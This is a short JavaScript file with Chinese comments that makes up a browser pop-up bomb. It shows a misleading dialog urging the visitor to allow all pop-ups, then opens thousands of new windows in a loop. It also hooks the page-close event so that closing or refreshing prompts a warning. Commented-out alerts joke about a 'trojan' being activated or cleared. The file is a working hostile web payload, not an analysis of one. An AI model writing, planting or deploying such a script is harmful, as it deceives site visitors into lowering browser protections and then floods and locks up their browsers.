// 阻擋使用者關閉或重新整理頁面（會跳出瀏覽器預設的關閉確認）
window.addEventListener('beforeunload', function (e) {
  e.preventDefault();
  e.returnValue = '';
});

// 持續跳出新分頁
function popupStorm(times) {
  if (times <= 0) return;
  window.open(location.href, '_blank', 'width=400,height=400');
  setTimeout(() => popupStorm(times - 1), 500);
}

// 倒數跳窗函式，結束後執行 callback
function popupFlood(countdown, callback) {
  let timer = setInterval(() => {
    if (countdown > 0) {
      //alert("⚠️ ");
      countdown--;
    } else {
      clearInterval(timer);
      //alert("😆 你被整了～其實沒事！");
      if (callback) callback();
    }
  }, 1000);
}

window.onload = function () {
  let result = confirm("若無法正常導向，請點擊右上方並允許一切彈出視窗");
  if (result) {
    //alert("開始清除木馬...");
    popupFlood(1, () => {
      popupStorm(3000); // 跳100次新視窗
    });
  } else {
    //alert("Too late 😈 木馬已啟動！");
    //popupFlood(3, () => {
      //popupStorm(100); // 跳100次新視窗
    //});
  }
};